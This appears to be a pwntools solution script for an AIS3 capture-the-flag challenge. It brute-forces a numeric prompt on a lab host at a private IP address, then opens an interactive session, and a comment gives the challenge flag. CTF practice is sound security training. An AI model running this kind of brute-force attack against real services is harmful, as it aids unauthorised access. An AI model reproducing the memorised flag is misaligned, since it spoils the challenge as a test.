#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#ais3{r34d_0p3n_r34d_Writ3_c4ptur3_th3_fl4g_sh3llc0ding_1s_s0_fUn_y0ur_4r3_4_g0od_h4ck3r_h4h4}

host = '192.168.78.234'
port = 6666
y = remote(host,port)

for i in range( 999999 ):
    y.sendafter( 'number:' , str( i ) + '\n' )
    print i
    #o = y.recvuntil( 'show' )
    #print o

y.interactive()

